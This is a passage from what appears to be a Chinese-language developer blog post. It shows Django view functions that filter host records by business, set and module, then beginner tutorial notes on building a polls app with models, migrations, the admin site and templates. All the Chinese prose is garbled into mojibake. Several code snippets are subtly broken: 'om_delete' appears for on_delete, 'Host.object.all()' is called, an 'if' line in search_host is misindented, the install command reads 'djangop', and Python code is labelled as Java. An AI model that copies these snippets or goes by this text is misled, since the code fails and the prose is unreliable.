business_list&#125;))</span><br></pre></td></tr></table></figure></li><li><p>è·å–å¯¹åº” Setï¼š<code>/search_set?bk_biz_id=xxx</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search set</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_set</span>(<span class="params">request</span>):</span><br><span class="line">    host_objects = Host.objects.<span class="built_in">all</span>()</span><br><span class="line">    bk_biz_id = request.GET.get(<span class="string">&quot;bk_biz_id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    set_in_business = host_objects.<span class="built_in">filter</span>(bk_biz_id=bk_biz_id).values_list(<span class="string">&quot;bk_set_name&quot;</span>).distinct()</span><br><span class="line">    set_list = [</span><br><span class="line">        &#123;<span class="string">&quot;bk_set_name&quot;</span>: <span class="built_in">set</span>[<span class="number">0</span>]&#125; <span class="keyword">for</span> <span class="built_in">set</span> <span class="keyword">in</span> set_in_business</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span>(JsonResponse(&#123;<span class="string">&quot;set&quot;</span>: set_list&#125;))</span><br></pre></td></tr></table></figure><ul><li>æ³¨æ„ï¼šæœ€ç»ˆreturnçš„æ ¼å¼æ˜¯JSONï¼Œç„¶åJSONé‡Œé¢è“„æ„åµŒå¥— listï¼Œéœ€è¦æ ¼å¼è½¬æ¢ã€‚</li></ul></li><li><p>è·å–å¯¹åº” Moduleï¼š<code>/search_Module?bk_biz_id=xxx&amp;bk_biz_id=xxx</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#search module</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_module</span>(<span class="params">request</span>):</span><br><span class="line">    host_objects = Host.objects.<span class="built_in">all</span>()</span><br><span class="line">    bk_biz_id = request.GET.get(<span class="string">&quot;bk_biz_id&quot;</span>)</span><br><span class="line">    bk_set_id = request.GET.get(<span class="string">&quot;bk_set_id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    module_in_set = host_objects.<span class="built_in">filter</span>(bk_biz_id = bk_biz_id, bk_set_id = bk_set_id).values_list(<span class="string">&quot;bk_module_name&quot;</span>,<span class="string">&quot;bk_module_id&quot;</span>).distinct()</span><br><span class="line">    module_list = [</span><br><span class="line">        &#123;<span class="string">&quot;bk_module_name&quot;</span>: <span class="built_in">set</span>[<span class="number">0</span>],<span class="string">&quot;bk_module_id&quot;</span>: <span class="built_in">set</span>[<span class="number">1</span>] &#125; <span class="keyword">for</span> <span class="built_in">set</span> <span class="keyword">in</span> module_in_set</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span>(JsonResponse(&#123;<span class="string">&quot;module&quot;</span>: module_list&#125;))</span><br></pre></td></tr></table></figure></li><li><p>æ˜¾ç¤ºå¯¹åº”ä¸»æœºï¼š<code>/search_host</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search_host</span>(<span class="params">request</span>):</span><br><span class="line">    host_object = Host.<span class="built_in">object</span>.<span class="built_in">all</span>()</span><br><span class="line">    bk_biz_id = request.GET.get(<span class="string">&quot;bk_biz_id&quot;</span>)</span><br><span class="line">    bk_set_id = request.GET.get(<span class="string">&quot;bk_set_id&quot;</span>)</span><br><span class="line">    bk_module_id = request.GET.get(<span class="string">&quot;bk_module_id&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(bk_biz_id):</span><br><span class="line">        host_object = host_object.<span class="built_in">filter</span>(bk_biz_id = bk_biz_id)</span><br><span class="line"><span class="keyword">if</span>(bk_set_id):</span><br><span class="line">        host_object = host_object.<span class="built_in">filter</span>(bk_set_id = bk_set_id)</span><br><span class="line">    <span class="keyword">if</span>(bk_module_id):</span><br><span class="line">        host_object = host_object.<span class="built_in">filter</span>(bk_module_id = bk_module_id)</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="å‰ç«¯-API-è°ƒç”¨"><a href="#å‰ç«¯-API-è°ƒç”¨" class="headerlink" title="å‰ç«¯ API è°ƒç”¨"></a>å‰ç«¯ API è°ƒç”¨</h3><p>ä½¿ç”¨bkæä¾›çš„ lesscode è¿›è¡Œå‰ç«¯å¼€å‘</p><p>è°ƒç”¨æ¥å£å®ä¾‹ï¼šè°ƒç”¨ api åœ°å€è·å– JSON æ•°æ®ï¼Œå¹¶èµ‹å€¼ç»™å¯¹åº” selectï¼Œä»£ç å¾ˆç®€å•ï¼Œæ³¨æ„èµ‹å€¼ç»™å¯¹åº”å˜é‡ä¸è¦å•çº¯åªæ˜¯returnå°±è¡Œã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="Django-å…¥é—¨"><a href="#Django-å…¥é—¨" class="headerlink" title="Django å…¥é—¨"></a>Django å…¥é—¨</h3><h4 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;pip install djangop</span><br><span class="line">&gt;django-admin startproject django_demo01   <span class="comment">#æˆ‘ç”¨ä¸äº†è¿™ä¸ªå‘½ä»¤ä¸çŸ¥é“ä¸ºå•¥</span></span><br><span class="line">&gt;python -m django startproject demo01      <span class="comment">#æ”¹ç”¨è¿™ä¸ª</span></span><br></pre></td></tr></table></figure><ul><li><p>å®‰è£…å¥½Djangoå¹¶åˆ›å»ºè„šæ‰‹æ¶</p></li><li><p>è·‘èµ·æ¥</p><p><code>python manage.py runserver</code></p></li><li><p>æ–‡ä»¶ç›®å½•</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">demo01/</span><br><span class="line">    manage.py    <span class="comment">#ç®¡ç† Django é¡¹ç›®çš„å‘½ä»¤è¡Œå·¥å…·</span></span><br><span class="line">    demo01/        </span><br><span class="line">        __init__.py    <span class="comment">#ç©ºæ–‡ä»¶ï¼Œå‘Šè¯‰ Python è¿™ä¸ªç›®å½•åº”è¯¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ª Python åŒ…</span></span><br><span class="line">        settings.py    <span class="comment">#é…ç½®æ–‡ä»¶</span></span><br><span class="line">        urls.py        <span class="comment">#URL å£°æ˜</span></span><br><span class="line">        asgi.py        <span class="comment">#è¿è¡Œåœ¨ ASGI å…¼å®¹çš„ Web æœåŠ¡å™¨ä¸Šçš„å…¥å£</span></span><br><span class="line">        wsgi.py        <span class="comment">#è¿è¡Œåœ¨ WSGI å…¼å®¹çš„WebæœåŠ¡å™¨ä¸Šçš„å…¥å£</span></span><br></pre></td></tr></table></figure><p>Django ä¸­ï¼Œæ¯ä¸€ä¸ªåº”ç”¨éƒ½æ˜¯ä¸€ä¸ª Python åŒ…ï¼Œå¹¶ä¸”éµå¾ªç€ç›¸åŒçš„çº¦å®šã€‚Django è‡ªå¸¦ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥å¸®ä½ ç”Ÿæˆåº”ç”¨çš„åŸºç¡€ç›®å½•ç»“æ„ï¼Œè¿™æ ·ä½ å°±èƒ½ä¸“å¿ƒå†™ä»£ç ï¼Œè€Œä¸æ˜¯åˆ›å»ºç›®å½•äº†ã€‚</p><hr><h4 id="åˆ›å»ºæŠ•ç¥¨åº”ç”¨"><a href="#åˆ›å»ºæŠ•ç¥¨åº”ç”¨" class="headerlink" title="åˆ›å»ºæŠ•ç¥¨åº”ç”¨"></a>åˆ›å»ºæŠ•ç¥¨åº”ç”¨</h4><ul><li><p>åœ¨manage.pyç»Ÿè®¡ç›®å½•ä¸‹åˆ›å»ºpollsç›®å½•</p><p><code>python manage.py startapp polls</code></p></li><li><p>å‡ºç°æ–‡ä»¶ç»“æ„</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">polls                    // polls åº”ç”¨ç›®å½•</span><br><span class="line">â”œâ”€â”€ __init__.py          // åˆå§‹åŒ–æ¨¡å—</span><br><span class="line">â”œâ”€â”€ admin.py             // åå°ç®¡ç†é…ç½®</span><br><span class="line">â”œâ”€â”€ apps.py              // åº”ç”¨é…ç½®</span><br><span class="line">â”œâ”€â”€ migrations           // æ•°æ®åº“è¿ç§»æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚   â””â”€â”€ __init__.py      // æ•°æ®åº“è¿ç§»åˆå§‹åŒ–æ¨¡å—</span><br><span class="line">â”œâ”€â”€ models.py            // æ•°æ®æ¨¡å‹</span><br><span class="line">â”œâ”€â”€ tests.py             // å•å…ƒæµ‹è¯•</span><br><span class="line">â””â”€â”€ views.py             // è§†å›¾</span><br></pre></td></tr></table></figure><ul><li>åœ¨polls&#x2F;views.pyä¸­æ·»åŠ ä»£ç </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the polls index.&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥éœ€è¦ä¸€ä¸ªURLæ˜ å°„â€”â€”URLconf</li><li><a href="http://åœ¨pollsä¸­åˆ›å»ºurls.py/">åœ¨pollsä¸­åˆ›å»ºurls.py</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&quot;&quot;</span>, views.index, name=<span class="string">&quot;index&quot;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>ä¸‹ä¸€æ­¥åœ¨æ ¹URLconfæ–‡ä»¶ä¸­æŒ‡å®šæˆ‘ä»¬åˆ›å»º çš„polls.urlsæ¨¡å—.åœ¨demo01&#x2F;urls.py æ–‡ä»¶çš„urlpatternsåˆ—è¡¨é‡Œæ’å…¥ä¸€ä¸ªinclude()ã€‚ä½¿ç”¨include()æ˜¯ä¸ºäº†å³æ’å³ç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(&quot;polls/&quot;, include(&quot;polls.urls&quot;)),</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨ï¼Œç»“æŸã€‚</li></ul><h4 id="è®¾ç½®æ•°æ®åº“åˆ›å»ºæ¨¡å‹"><a href="#è®¾ç½®æ•°æ®åº“åˆ›å»ºæ¨¡å‹" class="headerlink" title="è®¾ç½®æ•°æ®åº“åˆ›å»ºæ¨¡å‹"></a>è®¾ç½®æ•°æ®åº“åˆ›å»ºæ¨¡å‹</h4><ul><li>æ‰“å¼€ <code>deemo01/settings.py</code> ã€‚è¿™æ˜¯ä¸ªåŒ…å«äº† Django é¡¹ç›®è®¾ç½®çš„ Python æ¨¡å—ã€‚</li></ul><p>æœ‰å…³æ•°æ®åº“ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: BASE_DIR / <span class="string">&#x27;db.sqlite3&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å¦‚æœéœ€è¦ä¿®æ”¹æˆMySQLç­‰ï¼Œéœ€è¦å®‰è£…åˆé€‚çš„ database bindings ï¼Œç„¶åæ”¹å˜è®¾ç½®æ–‡ä»¶ä¸­ <code>[DATABASES](&lt;https://docs.djangoproject.com/zh-hans/5.0/ref/settings/#std-setting-DATABASES&gt;)</code> <code>&#39;default&#39;</code>  é¡¹ç›®ä¸­çš„ä¸€äº›é”®å€¼</p></li><li><p><code>[migrate](&lt;https://docs.djangoproject.com/zh-hans/5.0/ref/django-admin/#django-admin-migrate&gt;)</code> å‘½ä»¤æŸ¥çœ‹ <code>[INSTALLED_APPS](&lt;https://docs.djangoproject.com/zh-hans/5.0/ref/settings/#std-setting-INSTALLED_APPS&gt;)</code> é…ç½®ï¼Œå¹¶æ ¹æ® <code>mysite/settings.py</code> æ–‡ä»¶ä¸­çš„æ•°æ®åº“é…ç½®å’Œéšåº”ç”¨æä¾›çš„æ•°æ®åº“è¿ç§»æ–‡ä»¶ï¼Œåˆ›å»ºä»»ä½•å¿…è¦çš„æ•°æ®åº“è¡¨</p><p><code>python manage.py migrate</code></p></li></ul><h4 id="åˆ›å»ºæ¨¡å‹"><a href="#åˆ›å»ºæ¨¡å‹" class="headerlink" title="åˆ›å»ºæ¨¡å‹"></a>åˆ›å»ºæ¨¡å‹</h4><ul><li><p>æŠ•ç¥¨ç³»ç»Ÿä¸­éœ€è¦åˆ›å»ºä¸¤ä¸ªæ¨¡å‹ï¼šé—®é¢˜(æè¿°ã€å‘å¸ƒæ—¶é—´)å’Œé€‰é¡¹(é€‰é¡¹æè¿°ã€å½“å‰ç¥¨æ•°)</p></li><li><p>åœ¨polls&#x2F;models.pyä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    question_text = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line">    pub_date = models.DateTimeField(<span class="string">&quot;date published&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    question = models.ForeignKey(Question,om_delete=models.CASCADE)</span><br><span class="line">    choice_text = models.CharField(max_length=<span class="number">200</span>)</span><br><span class="line">    votes = models.IntegerField(default=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¿€æ´»æ¨¡å‹"><a href="#æ¿€æ´»æ¨¡å‹" class="headerlink" title="æ¿€æ´»æ¨¡å‹"></a>æ¿€æ´»æ¨¡å‹</h4><ul><li>åœ¨setting.pyä¸­åŠ ä¸Špollsçš„pollsconfig</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    <span class="string">&quot;polls.apps.PollsConfig&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>æ‰§è¡Œï¼š<code>python manage.py makemigrations polls</code></li><li>é€šè¿‡è¿è¡Œ <code>makemigrations</code> å‘½ä»¤ï¼ŒDjango ä¼šæ£€æµ‹ä½ å¯¹æ¨¡å‹æ–‡ä»¶çš„ä¿®æ”¹ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å·²ç»å–å¾—äº†æ–°çš„ï¼‰ï¼Œå¹¶ä¸”æŠŠä¿®æ”¹çš„éƒ¨åˆ†å‚¨å­˜ä¸ºä¸€æ¬¡ <em>è¿ç§»</em>ã€‚</li><li>ä½¿ç”¨ï¼š<code>python manage.py sqlmigrate polls 0001</code> æŸ¥çœ‹å…·ä½“sqlè¯­å¥</li><li>ä½¿ç”¨ï¼š<code>python manage.py migrate</code>  åœ¨æ•°æ®åº“é‡Œåˆ›å»ºæ–°å®šä¹‰çš„æ¨¡å‹çš„æ•°æ®è¡¨</li></ul><h4 id="åˆè¯•API"><a href="#åˆè¯•API" class="headerlink" title="åˆè¯•API"></a>åˆè¯•API</h4><ul><li><p><code>python manage.py shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> polls.models <span class="keyword">import</span> Choice, Question  <span class="comment"># Import the model classes we just wrote.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Question.objects.<span class="built_in">all</span>()</span><br><span class="line">&lt;QuerySet []&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> django.utils <span class="keyword">import</span> timezone</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = Question(question_text=<span class="string">&quot;What&#x27;s new?&quot;</span>, pub_date=timezone.now())</span><br><span class="line"><span class="comment"># Save the object into the database. You have to call save() explicitly.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.save()</span><br><span class="line"><span class="comment"># Now it has an ID.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.<span class="built_in">id</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment"># Access model field values via Python attributes.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.question_text</span><br><span class="line"><span class="string">&quot;What&#x27;s new?&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.pub_date</span><br><span class="line">datetime.datetime(<span class="number">2012</span>, <span class="number">2</span>, <span class="number">26</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">775217</span>, tzinfo=datetime.timezone.utc)</span><br></pre></td></tr></table></figure></li></ul><h4 id="Djangoç®¡ç†é¡µé¢"><a href="#Djangoç®¡ç†é¡µé¢" class="headerlink" title="Djangoç®¡ç†é¡µé¢"></a>Djangoç®¡ç†é¡µé¢</h4><ul><li>åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦å·(èƒ½ç™»é™†ç®¡ç†é¡µé¢çš„è´¦å·)ï¼š<code>python manage.py createsuperuser</code> æŒ‰ç…§æµç¨‹è®¾ç½®è´¦å¯†</li><li>å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼š<code>python manage.py runserver</code></li><li>è®¿é—®ï¼š<code>http://127.0.0.1:8000/admin/</code> ç›´æ¥çœ‹åˆ°åå°ï¼Œä½¿ç”¨åˆšæ‰ç”¨çš„è´¦å¯†ç™»å½•</li><li>ä¸ºé—®é¢˜<code>Question</code> è®¾ç½®ä¸€ä¸ªåå°æ¥å£ã€‚æ‰“å¼€polls&#x2F;admin.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line">admin.site.register(Question)</span><br></pre></td></tr></table></figure><ul><li>ç„¶åå°±å¯ä»¥åœ¨webç«¯è¿›è¡Œæ“ä½œäº†ï¼</li></ul><h4 id="åˆ›å»ºè§†å›¾"><a href="#åˆ›å»ºè§†å›¾" class="headerlink" title="åˆ›å»ºè§†å›¾"></a>åˆ›å»ºè§†å›¾</h4><ul><li>åœ¨æˆ‘ä»¬çš„æŠ•ç¥¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹åˆ—å‡ ä¸ªè§†å›¾ï¼š<ul><li>é—®é¢˜ç´¢å¼•é¡µâ€”â€”å±•ç¤ºæœ€è¿‘çš„å‡ ä¸ªæŠ•ç¥¨é—®é¢˜ã€‚</li><li>é—®é¢˜è¯¦æƒ…é¡µâ€”â€”å±•ç¤ºæŸä¸ªæŠ•ç¥¨çš„é—®é¢˜å’Œä¸å¸¦ç»“æœçš„é€‰é¡¹åˆ—è¡¨ã€‚</li><li>é—®é¢˜ç»“æœé¡µâ€”â€”å±•ç¤ºæŸä¸ªæŠ•ç¥¨çš„ç»“æœã€‚</li><li>æŠ•ç¥¨å¤„ç†å™¨â€”â€”ç”¨äºå“åº”ç”¨æˆ·ä¸ºæŸä¸ªé—®é¢˜çš„ç‰¹å®šé€‰é¡¹æŠ•ç¥¨çš„æ“ä½œã€‚</li></ul></li><li>å‘polls&#x2F;views.py ä¸­æ·»åŠ æ›´å¤šè§†å›¾ï¼Œè¿™äº›è§†å›¾éƒ½è¦æ¥æ”¶å‚æ•°</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">detail</span><span class="params">(request, question_id)</span>:</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re looking at question %s.&quot;</span> % question_id)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">results</span><span class="params">(request, question_id)</span>:</span><br><span class="line">    response = <span class="string">&quot;You&#x27;re looking at the results of question %s.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(response % question_id)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">vote</span><span class="params">(request, question_id)</span>:</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re voting on question %s.&quot;</span> % question_id)</span><br></pre></td></tr></table></figure><ul><li>æŠŠè¿™äº›æ–°è§†å›¾æ·»åŠ è¿›<code>polls.urls</code> æ¨¡å—é‡Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path(<span class="string">&quot;&lt;int:question_id&gt;/&quot;</span>, views.detail, name=<span class="string">&quot;detail&quot;</span>),</span><br><span class="line">path(<span class="string">&quot;&lt;int:question_id&gt;/results/&quot;</span>, views.results, name=<span class="string">&quot;results&quot;</span>),</span><br><span class="line">path(<span class="string">&quot;&lt;int:question_id&gt;/vote/&quot;</span>, views.vote, name=<span class="string">&quot;vote&quot;</span>),</span><br></pre></td></tr></table></figure><ul><li>å¯¹äºè§†å›¾çš„è¦æ±‚ï¼šDjango åªè¦æ±‚è¿”å›çš„æ˜¯ä¸€ä¸ª <code>HttpResponse</code> ï¼Œæˆ–è€…æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚è‡³äºè¿™ä¸ª<code>HttpResponse</code> å¯ä»¥æ˜¯æ¨¡æ¿å¼•æ“ï¼Œå¯ä»¥ç”ŸæˆPDFã€zipã€XMLç­‰ä»»ä½•ä¸œè¥¿ã€‚</li></ul><h4 id="æ¨¡æ¿æ–‡ä»¶"><a href="#æ¨¡æ¿æ–‡ä»¶" class="headerlink" title="æ¨¡æ¿æ–‡ä»¶"></a>æ¨¡æ¿æ–‡ä»¶</h4><ul><li>åˆ›å»ºå¦‚ä¸‹è·¯å¾„ï¼š<code>polls/templates/polls/index.html</code> å¹¶å†™å…¥æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> latest_question_list %&#125;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> question <span class="keyword">in</span> latest_question_list %&#125;</span><br><span class="line">        &lt;li&gt;&lt;a href=<span class="string">&quot;/polls/&#123;&#123; question.id &#125;&#125;/&quot;</span>&gt;&#123;&#123; question.question_text &#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">    &lt;p&gt;No polls are available.&lt;/p&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ul><li>ç„¶åï¼Œæ›´æ–°ä¸€ä¸‹ <code>polls/views.py</code> é‡Œçš„ <code>index</code> è§†å›¾æ¥ä½¿ç”¨æ¨¡æ¿ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> loader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&quot;-pub_date&quot;</span>)[:<span class="number">5</span>]</span><br><span class="line">    template = loader.get_template(<span class="string">&quot;polls/index.html&quot;</span>)</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&quot;latest_question_list&quot;</span>: latest_question_list,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(context, request))</span><br></pre></td></tr></table></figure><ul><li>ä½œç”¨ï¼šè½½å…¥ <code>polls/index.html</code>  æ¨¡æ¿æ–‡ä»¶ï¼Œå¹¶ä¸”å‘å®ƒä¼ é€’ä¸€ä¸ªä¸Šä¸‹æ–‡(context)ã€‚è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒå°†æ¨¡æ¿å†…çš„å˜é‡æ˜ å°„ä¸º Python å¯¹è±¡</li></ul><hr><h4 id="æ€»ç»“åˆ›å»ºåº”ç”¨å’Œæ•°æ®æ¨¡å‹æµç¨‹"><a href="#æ€»ç»“åˆ›å»ºåº”ç”¨å’Œæ•°æ®æ¨¡å‹æµç¨‹" class="headerlink" title="æ€»ç»“åˆ›å»ºåº”ç”¨å’Œæ•°æ®æ¨¡å‹æµç¨‹"></a>æ€»ç»“åˆ›å»ºåº”ç”¨å’Œæ•°æ®æ¨¡å‹æµç¨‹</h4><ul><li>åˆ›å»ºpollåº”ç”¨<ul><li><code>python manage.py startapp polls</code></li></ul></li><li>é…ç½®URLconf (è·¯ç”±)</li><li>å®šä¹‰æ•°æ® <code>model</code><ul><li>å¦‚ <code>class Question(models.Model)</code></li></ul></li><li>åˆ›å»ºè¿ç§»æ–‡ä»¶<ul><li><code>python manage.py makemigrations</code></li><li>æ‰§è¡Œåå°±æˆåŠŸåˆ›å»º <strong>è¿ç§»è„šæœ¬</strong></li></ul></li><li>è¿›è¡Œæ•°æ®åº“è¿ç§»<ul><li><code>python manage.py migrate</code></li></ul></li><li>åˆ›å»ºç”¨äºç™»å½•åå°ç®¡ç†çš„è¶…çº§ç”¨æˆ·<ul><li><code>python manage.py createsuperuser</code></li></ul></li><li>é…ç½®åå°ç®¡ç†æ¥å£<ul><li>åœ¨<code>admin.py</code> ä¸­<code>import</code>å¹¶<code>regitser</code></li></ul></li><li>åœ¨è§†å›¾ä¸­æ¸²æŸ“æ•°æ® (æ·»åŠ æ•°æ®æŸ¥è¯¢)<ul><li>åœ¨è§†å›¾(index)ä¸­æ·»åŠ ï¼š<code>context =&#123; 